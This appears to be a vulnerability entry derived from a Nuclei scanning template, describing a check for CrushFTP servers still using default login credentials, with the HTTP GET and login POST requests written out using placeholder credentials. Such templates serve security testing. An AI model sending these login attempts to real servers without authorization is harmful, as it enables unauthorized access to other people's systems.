# Vulnerability: CrushFTP - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`crushftp-default-login.yaml`)

## Description
CrushFTP default login credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /WebInterface/ HTTP/1.1
Host: {{Hostname}}

POST /WebInterface/function/ HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}/WebInterface/login.html

command=login&username={{username}}&password={{password}}&encoded=true&language=en&random=0.34712915617878926
```

